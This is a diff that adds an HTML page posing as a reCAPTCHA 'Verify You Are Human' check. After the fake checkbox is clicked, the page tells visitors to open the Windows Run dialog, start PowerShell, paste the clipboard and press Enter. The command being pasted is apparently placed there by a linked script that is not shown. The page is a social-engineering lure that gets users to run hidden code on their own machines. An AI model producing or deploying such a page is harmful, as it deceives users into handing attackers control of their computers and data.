@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify You Are Human</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="./index.css">
+</head>
+
+<body>
+
+    <div class="container">
+        <h1>Verify You Are Human</h1>
+        <p>Please verify that you are a human to continue.</p>
+        <button class="verify-btn" onclick="showSteps()">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA Logo">
+            <p class="verify-label"> I'm not a robot</p>
+        </button>
+
+    </div>
+
+    <div class="verification-container" id="verification-container">
+        <div class="verification-steps">
+            <h2>Verification Steps</h2>
+            <div>
+                <p>1. Press <i class="fab fa-windows"></i> + <b>R</b></p>
+                <p>2. Input <b>powershell</b> and press <b>Enter</b></p>
+                <p>2. Press <b>Ctrl + V</b></p>
+                <p>3. Press <b>Enter</b></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="./index.js"></script>
+
+</body>
+
+</html>
